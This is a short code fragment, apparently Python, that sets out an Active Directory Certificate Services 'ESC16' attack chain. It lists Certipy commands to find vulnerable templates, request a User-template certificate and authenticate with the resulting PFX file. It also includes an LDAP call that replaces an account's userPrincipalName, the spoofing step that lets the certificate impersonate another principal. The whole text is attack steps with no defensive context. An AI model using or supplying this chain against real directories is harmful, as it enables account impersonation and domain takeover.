options = "ESC16 szOID_NTDS_CA_SECURITY_EXT StrongCertificateBindingEnforcement"
commands = ["certipy find -vulnerable", "certipy req -template User", "certipy auth -pfx user.pfx"]
conn.modify(dn, {"userPrincipalName": [MODIFY_REPLACE, upn]})
